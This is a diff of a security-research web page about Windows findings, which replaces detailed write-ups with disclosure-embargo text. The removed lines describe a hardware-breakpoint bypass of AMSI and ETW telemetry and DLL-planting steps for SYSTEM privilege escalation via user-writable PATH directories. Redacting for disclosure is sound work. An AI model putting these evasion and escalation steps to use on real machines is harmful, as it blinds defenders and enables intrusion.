@@ -317,9 +317,9 @@ footer a:hover { color: var(--green); }
 <span class="out-green">  [SYSTEM]   Replaced a LocalSystem service binary as a standard user.</span>
 <span class="out-green">             No admin creds. No UAC. Full SYSTEM token on reboot.</span>
 <span class="out"></span>
-<span class="out-amber">  [MSRC]     Defender tamper protection blind spot: hardware breakpoints</span>
-<span class="out-amber">             bypass AMSI + ETW without modifying a single byte of memory.</span>
-<span class="out-amber">             No behavioral rule exists for SetThreadContext on debug registers.</span>
+<span class="out-amber">  [MSRC]     Defender tamper protection blind spot identified and reported.</span>
+<span class="out-amber">             AMSI + ETW bypassed without modifying memory.</span>
+<span class="out-amber">             Technique under coordinated disclosure embargo.</span>
 <span class="out"></span>
 <span class="out-cyan">  [CWE-427]  User-writable directories in the machine-level SYSTEM PATH.</span>
 <span class="out-cyan">             Third-party installers created a system-wide privesc vector.</span>
@@ -346,91 +346,74 @@ footer a:hover { color: var(--green); }
 
 <!-- ═══════ DARK ROOM ═══════ -->
 <section class="entry" id="darkroom">
-  <div class="entry-date">ENGAGEMENTS 7-9 // FINDINGS #31-#37</div>
+  <div class="entry-date">ENGAGEMENTS 7-9 // 2026</div>
   <h2>the dark room</h2>
 
   <p>
-    Defender has two user-mode telemetry gates: AMSI (script content scanning) and
-    ETW (process event tracing). Both can be bypassed. But HOW you bypass them matters.
-    The classic approach — VirtualProtect + patch bytes — gets caught immediately.
-    Defender has specific behavioral signatures for exactly this pattern.
+    Two telemetry gates stand between your code and invisibility: AMSI scans
+    every script buffer before it executes, ETW traces every process event back
+    to Defender. Kill both and you're operating in the dark. Defender can't see
+    your scripts. Can't see your process activity. Can't see shit.
+  </p>
+  <p>
+    Tried the textbook AMSI patch first. VirtualProtect on amsi.dll, write the
+    bytes, let it rip. Defender killed it in under two seconds.
   </p>
 
-  <div class="term" data-title="engagement 7 // amsi classic patch">
+  <div class="term" data-title="engagement 7 // the textbook approach dies">
 <span class="prompt"></span><span class="cmd">.\amsi_bypass.exe --patch</span>
 <span class="out-red">  [!] Process killed by Defender</span>
 <span class="out-red">  [!] Detection: Behavior:Win32/AMSI_Patch_T.B12</span>
 <span class="out-red">  [!] Binary quarantined retroactively (Trojan:Win32/Bearfoos.B!ml)</span>
 <span class="out"></span>
-<span class="comment">  # VirtualProtect on amsi.dll = instant behavioral detection.</span>
-<span class="comment">  # Defender watches for EXACTLY this: memory permission change</span>
-<span class="comment">  # on AMSI code region followed by write. Specific rule. Named rule.</span>
-<span class="comment">  # The binary survived static analysis (XOR-encoded strings) but</span>
-<span class="comment">  # the ACT of patching is what triggers the kill.</span>
+<span class="comment">  # Named rule. Specific to memory permission change + write on AMSI.</span>
+<span class="comment">  # Good. Now I know exactly what you're looking for.</span>
   </div>
 
   <p>
-    So I stopped trying to patch memory. Instead: hardware breakpoints. CPU debug
-    registers (DR0-DR3) intercept function execution at the hardware level. No
-    VirtualProtect. No memory writes. Zero bytes modified in amsi.dll. Defender's
-    tamper protection monitors memory — not CPU registers.
+    That ruled out memory patching. But it also handed me everything I needed —
+    exactly what Defender watches. Memory permission changes on protected DLLs.
+    Code region writes. Specific patterns. Named signatures. So I stopped writing
+    to memory altogether and found a way to get the same result without it.
+  </p>
+  <p>
+    Can't talk about the mechanism. It's under coordinated disclosure with MSRC.
+    What I'll put on the record: zero bytes modified in the target DLLs. No
+    VirtualProtect. The thing Tamper Protection monitors — memory integrity —
+    never gets touched. Because the approach doesn't go through memory.
+  </p>
+  <p>
+    Applied it to AMSI. Applied it to ETW. Combined both into one loader.
+    All user-mode telemetry went dark from a standard user context. No elevation.
+    No admin credentials. The control test proved the gap — classic memory patch
+    gets caught every time. This doesn't.
+  </p>
+  <p>
+    I reported it because I want Microsoft to close this, not leave it open for
+    someone who won't say anything. Details drop when the embargo lifts.
   </p>
 
-  <div class="term" data-title="engagement 7 // amsi hwbp bypass">
-<span class="prompt"></span><span class="cmd">.\amsi_bypass_hwbp.exe</span>
+  <div class="term" data-title="coordinated disclosure">
+<span class="out-amber">  MSRC SUBMISSION ACTIVE</span>
+<span class="out">  Technique details embargoed pending Microsoft review.</span>
+<span class="out">  Full PoC source, evidence package, and remediation</span>
+<span class="out">  recommendations provided to MSRC directly.</span>
 <span class="out"></span>
-<span class="out">  Phase 1: amsi.dll loaded at 0x00007FFD6E8F0000</span>
-<span class="out">  Phase 1: AmsiScanBuffer at 0x00007FFD6E8F8160</span>
-<span class="out-green">  Phase 2: DR0 = 0x00007FFD6E8F8160 (execution breakpoint)</span>
-<span class="out-green">  Phase 2: DR7 = 0x00000401 (local DR0 enable, exec, 1-byte)</span>
-<span class="out-green">  Phase 2: VEH handler registered</span>
-<span class="out">  Phase 3: calling AmsiScanBuffer...</span>
-<span class="out-green">  Phase 3: result = 0x80070057 (E_INVALIDARG)</span>
-<span class="out-green">  Phase 3: AMSI BYPASSED -- function never executed</span>
+<span class="out">  What I can say publicly:</span>
+<span class="out">    - Tamper Protection monitors memory integrity</span>
+<span class="out">    - This technique does not modify memory</span>
+<span class="out">    - AMSI + ETW defeated simultaneously</span>
+<span class="out">    - Standard user privilege, no elevation</span>
+<span class="out">    - Control test confirms the detection gap</span>
 <span class="out"></span>
-<span class="out">  Defender detection:  NONE</span>
-<span class="out">  Binary quarantined:  NO</span>
-<span class="out">  Memory modified:     0 bytes</span>
-<span class="out">  VirtualProtect calls: 0</span>
+<span class="out">  Details on patch or after embargo window closes.</span>
   </div>
 
   <p>
-    Same technique applied to ETW. EtwEventWrite in ntdll — same hardware breakpoint
-    approach, same result. Dead man test confirmed: called EtwEventWrite with a garbage
-    handle (0xDEADBEEF). Normal execution would error. With the breakpoint active, it
-    returned STATUS_SUCCESS — proof the function body never ran.
-  </p>
-
-  <div class="term" data-title="engagement 9 // dark room operational">
-<span class="prompt"></span><span class="cmd">.\dark_room.exe</span>
-<span class="out"></span>
-<span class="out">  PHASE 1: LOCATE</span>
-<span class="out">    AmsiScanBuffer at 0x00007FFD6E8F8160</span>
-<span class="out">    EtwEventWrite  at 0x00007FFD917E0430</span>
-<span class="out"></span>
-<span class="out">  PHASE 2: ACTIVATE</span>
-<span class="out-green">    DR0 = AmsiScanBuffer (AMSI blind)     OK</span>
-<span class="out-green">    DR1 = EtwEventWrite  (ETW blind)      OK</span>
-<span class="out-green">    DR7 = 0x00000405 (dual exec BP)       OK</span>
-<span class="out-green">    VEH unified handler registered         OK</span>
-<span class="out"></span>
-<span class="out">  PHASE 3: VERIFY</span>
-<span class="out-green">    AMSI:  0x80070057  E_INVALIDARG       BLIND</span>
-<span class="out-green">    ETW:   0x00000000  STATUS_SUCCESS     BLIND</span>
-<span class="out"></span>
-<span class="out-green">  DARK ROOM OPERATIONAL</span>
-<span class="out">  All user-mode telemetry defeated.</span>
-<span class="out">  0 bytes modified. 0 VirtualProtect calls.</span>
-<span class="out">  Defender detection: NONE</span>
-  </div>
-
-  <p>
-    <span class="tag tag-confirmed">CONFIRMED</span>
-    <span class="tag tag-msrc">MSRC POTENTIAL</span>
-    <strong>Finding #36:</strong> Defender's tamper protection has a systemic blind spot.
-    It monitors memory integrity but not CPU debug register state. SetThreadContext
-    on your own thread is a standard API — there is no behavioral rule for it.
-    Two independent bypasses (AMSI, ETW) using the same architectural gap.
+    <span class="tag tag-msrc">EMBARGOED</span>
+    Tamper Protection bypass identified and submitted to MSRC. The classic
+    memory-patch technique is detected (proven above). This technique isn't.
+    Same result, different road. Everything else is under the embargo.
   </p>
 </section>
 
@@ -511,7 +494,7 @@ footer a:hover { color: var(--green); }
 
 <!-- ═══════ PATH INJECTION ═══════ -->
 <section class="entry" id="pathinjection">
-  <div class="entry-date">ENGAGEMENT 13 // FINDINGS #47-#49b</div>
+  <div class="entry-date">ENGAGEMENT 13 // 2026</div>
   <h2>path injection -- the installer did it</h2>
 
   <p>
@@ -519,61 +502,35 @@ footer a:hover { color: var(--green); }
     HKLM PATH. A standard user owns those directories. Every SYSTEM service that
     searches PATH for a DLL traverses attacker-controlled ground.
   </p>
-
-  <div class="term" data-title="engagement 13 // path audit">
-<span class="prompt"></span><span class="cmd">reg query "HKLM\...\Environment" /v Path | findstr /i "Users"</span>
-<span class="out"></span>
-<span class="out-red">    C:\Users\gwu07\AppData\Local\Muse Hub\lib</span>
-<span class="out-red">    C:\Users\gwu07\.local\bin</span>
-<span class="out"></span>
-<span class="prompt"></span><span class="cmd">icacls "C:\Users\gwu07\AppData\Local\Muse Hub\lib"</span>
-<span class="out-green">    gwu07:(OI)(CI)(F)     FULL CONTROL</span>
-<span class="out-green">    SYSTEM:(OI)(CI)(F)</span>
-<span class="out-green">    Administrators:(OI)(CI)(F)</span>
-<span class="out"></span>
-<span class="comment">  # User-writable directory in the machine-wide DLL search path.</span>
-<span class="comment">  # Muse Hub installer put it there. uv (Astral) put .local\bin there.</span>
-<span class="comment">  # Both vendors injected user-profile paths into HKLM scope.</span>
-  </div>
-
   <p>
-    Known phantom DLLs -- SprintCSP.dll (StorSvc, SYSTEM), cdpsgshims.dll
-    (CdpSvc, LocalService) -- don't exist on disk. When their services start,
-    Windows searches PATH. Finds attacker's planted DLL in the user-writable
-    Muse Hub directory. DllMain executes as NT AUTHORITY\SYSTEM.
+    Found multiple vendors injecting user-writable paths into the machine-wide
+    SYSTEM search path. Planted canary DLLs in the writable directories for known
+    phantom DLL targets — DLLs that SYSTEM services search for but don't exist on
+    disk. Standard user creates the file, SYSTEM service loads it on next start.
+  </p>
+  <p>
+    CWE-426: Untrusted Search Path Element. The installers created the attack
+    surface. Windows services are the victims. Multiple vendors affected.
   </p>
 
-  <div class="term" data-title="engagement 13 // canary deployment">
-<span class="prompt"></span><span class="cmd">copy canary.dll "...\Muse Hub\lib\SprintCSP.dll"</span>
-<span class="out-green">  1 file(s) copied.</span>
-<span class="prompt"></span><span class="cmd">copy canary.dll "...\Muse Hub\lib\cdpsgshims.dll"</span>
-<span class="out-green">  1 file(s) copied.</span>
+  <div class="term" data-title="status">
+<span class="out-amber">  VENDOR DISCLOSURE IN PROGRESS</span>
+<span class="out">  Vulnerability class:  CWE-426 / CWE-427 (PATH injection)</span>
+<span class="out">  Impact:               Standard user to SYSTEM via DLL plant</span>
+<span class="out">  Vendors affected:     Multiple (details withheld)</span>
+<span class="out">  Submission target:    MITRE CVE</span>
+<span class="out">  Canaries:             Planted, awaiting execution proof</span>
 <span class="out"></span>
-<span class="comment">  # Canary DLL: logs username + elevation + PID to %TEMP%</span>
-<span class="comment">  # No payload. No shell. No persistence. Just proof.</span>
-<span class="comment">  # SHA256: F4DEF9FFE9875DEDDC2C22E11A3207EF9DA81E7F2FBEBD1F7273D557F8D9CDDF</span>
-<span class="out"></span>
-<span class="out-amber">  CANARIES PLANTED. AWAITING REBOOT FOR SYSTEM EXECUTION PROOF.</span>
+<span class="out">  Vendor names, specific paths, and phantom DLL targets</span>
+<span class="out">  withheld until vendors are notified and given response time.</span>
   </div>
 
   <p>
-    <span class="tag tag-msrc">CVE PENDING</span>
+    <span class="tag tag-msrc">DISCLOSURE PENDING</span>
     <span class="tag tag-confirmed">CONFIRMED</span>
-    <strong>Finding #49:</strong> Muse Hub PATH injection (CWE-426). CVSS 7.8 (High).
-    Not CVE-2025-13433 (that's CWE-428, unquoted path -- different class entirely).
-    This is an untrusted search path element. The installer created the attack surface;
-    Windows services are the victim. MITRE submission prepared.
-  </p>
-  <p>
-    <span class="tag tag-msrc">CVE PENDING</span>
-    <strong>Finding #49b:</strong> Same class, different vendor. <code>uv</code> (Astral)
-    puts <code>~/.local/bin</code> in HKLM PATH. Same user-writable, same SYSTEM traversal.
-  </p>
-  <p>
-    <span class="tag tag-detected">THEORETICAL</span>
-    <strong>Finding #47:</strong> Phantom DLL osppc.dll in ClickToRunSvc (SYSTEM).
-    Report written but zero ProcMon evidence. Consumer M365 may never trigger this
-    code path. Without ProcMon trace, MSRC will bounce it.
+    PATH injection to SYSTEM privilege escalation. CVSS 7.8 (High).
+    Vendor notification and MITRE submission in progress. Details
+    withheld pending coordinated disclosure.
   </p>
 </section>
 
@@ -674,15 +631,13 @@ footer a:hover { color: var(--green); }
 <span class="out">    [locked]   C:\Program Files\nodejs\</span>
 <span class="out">    [locked]   C:\ProgramData\chocolatey\bin</span>
 <span class="out">    [locked]   C:\Program Files\dotnet\</span>
-<span class="out-red">    [WRITABLE] C:\Users\user\.local\bin            &lt;-- CWE-427</span>
+<span class="out-red">    [WRITABLE] C:\Users\user\AppData\Local\[REDACTED]\lib  &lt;-- CWE-427</span>
 <span class="out">    [locked]   C:\Program Files\Git\cmd</span>
-<span class="out-red">    [WRITABLE] C:\Users\user\AppData\Local\Muse Hub\lib  &lt;-- CWE-427</span>
+<span class="out-red">    [WRITABLE] C:\Users\user\[REDACTED]            &lt;-- CWE-427</span>
 <span class="out">    [locked]   C:\Program Files\Microsoft SQL Server\...</span>
 <span class="out"></span>
 <span class="out-amber">  2 user-writable directories in machine-level SYSTEM PATH.</span>
-<span class="out-amber">  Associated services running as LocalSystem:</span>
-<span class="out-amber">    MuseAuthService  -- RUNNING (LocalSystem)</span>
-<span class="out-amber">    MuseHubUpdater   -- Stopped (LocalSystem)</span>
+<span class="out-amber">  Associated services: [REDACTED — vendor disclosure pending]</span>
 <span class="out"></span>
 <span class="comment">  # CWE-427: Uncontrolled Search Path Element.</span>
 <span class="comment">  # Any SYSTEM process doing a PATH search for a DLL or EXE will find</span>
@@ -724,20 +679,20 @@ footer a:hover { color: var(--green); }
       <tr>
         <td style="color:var(--dim)">1</td>
         <td>AMSI bypass</td>
-        <td><span class="tag tag-confirmed">CONFIRMED</span></td>
-        <td style="color:var(--dim)">Hardware breakpoints, 0 bytes modified</td>
+        <td><span class="tag tag-msrc">EMBARGOED</span></td>
+        <td style="color:var(--dim)">0 bytes modified — technique under MSRC disclosure</td>
       </tr>
       <tr>
         <td style="color:var(--dim)">2</td>
         <td>ETW bypass</td>
-        <td><span class="tag tag-confirmed">CONFIRMED</span></td>
-        <td style="color:var(--dim)">Hardware breakpoints, dead man test passed</td>
+        <td><span class="tag tag-msrc">EMBARGOED</span></td>
+        <td style="color:var(--dim)">Dead man test passed — technique under MSRC disclosure</td>
       </tr>
       <tr>
         <td style="color:var(--dim)">1+2</td>
         <td>Dark room</td>
-        <td><span class="tag tag-confirmed">OPERATIONAL</span></td>
-        <td style="color:var(--dim)">Dual HWBP, all user-mode telemetry blind</td>
+        <td><span class="tag tag-msrc">EMBARGOED</span></td>
+        <td style="color:var(--dim)">Combined bypass — details under coordinated disclosure</td>
       </tr>
       <tr>
         <td style="color:var(--dim)">3a</td>
@@ -791,23 +746,23 @@ footer a:hover { color: var(--green); }
     <tbody>
       <tr>
         <td>AMSI tamper protection</td>
-        <td><span class="tag tag-confirmed" style="background:#002200">BYPASSED</span></td>
-        <td style="color:var(--dim)">#33 (HWBP)</td>
+        <td><span class="tag tag-msrc">EMBARGOED</span></td>
+        <td style="color:var(--dim)">MSRC coordinated disclosure</td>
       </tr>
       <tr>
         <td>ETW process telemetry</td>
-        <td><span class="tag tag-confirmed" style="background:#002200">BYPASSED</span></td>
-        <td style="color:var(--dim)">#35 (HWBP)</td>
+        <td><span class="tag tag-msrc">EMBARGOED</span></td>
+        <td style="color:var(--dim)">MSRC coordinated disclosure</td>
       </tr>
       <tr>
         <td>Defender static analysis</td>
         <td><span class="tag tag-confirmed" style="background:#002200">DEFEATED</span></td>
-        <td style="color:var(--dim)">#32 (XOR)</td>
+        <td style="color:var(--dim)">XOR string encoding</td>
       </tr>
       <tr>
         <td>Defender behavioral analysis</td>
-        <td><span class="tag tag-confirmed" style="background:#002200">DEFEATED</span></td>
-        <td style="color:var(--dim)">#33 (no VirtualProtect)</td>
+        <td><span class="tag tag-msrc">EMBARGOED</span></td>
+        <td style="color:var(--dim)">Technique avoids known signatures</td>
       </tr>
       <tr>
         <td>Service binary ACLs</td>
@@ -832,7 +787,7 @@ footer a:hover { color: var(--green); }
       <tr>
         <td>SYSTEM PATH integrity</td>
         <td><span class="tag tag-detected">BROKEN</span></td>
-        <td style="color:var(--dim)">#49 (CWE-426, Muse Hub + uv)</td>
+        <td style="color:var(--dim)">#49 (CWE-426 — vendor disclosure pending)</td>
       </tr>
       <tr>
         <td>cldflt.sys race window</td>
@@ -857,8 +812,8 @@ footer a:hover { color: var(--green); }
 <span class="out-green">                    Canary fired. SYSTEM token. Elevated. Confirmed.</span>
 <span class="out"></span>
 <span class="out-amber">  CVE submissions ready:</span>
-<span class="out-amber">    #36 -> MSRC   Defender HWBP tamper bypass (20-35%)</span>
-<span class="out-amber">    #49 -> MITRE  Muse Hub PATH injection, CWE-426 (60-70%)</span>
+<span class="out-amber">    #36 -> MSRC   Tamper Protection bypass — under coordinated disclosure</span>
+<span class="out-amber">    #49 -> MITRE  PATH injection, CWE-426 — vendor disclosure pending (60-70%)</span>
 <span class="out-amber">    #42 -> Vendor Wondershare service binary, CWE-732 (60-70%)</span>
 <span class="out"></span>
 <span class="out-cyan">  Moonshot:</span>
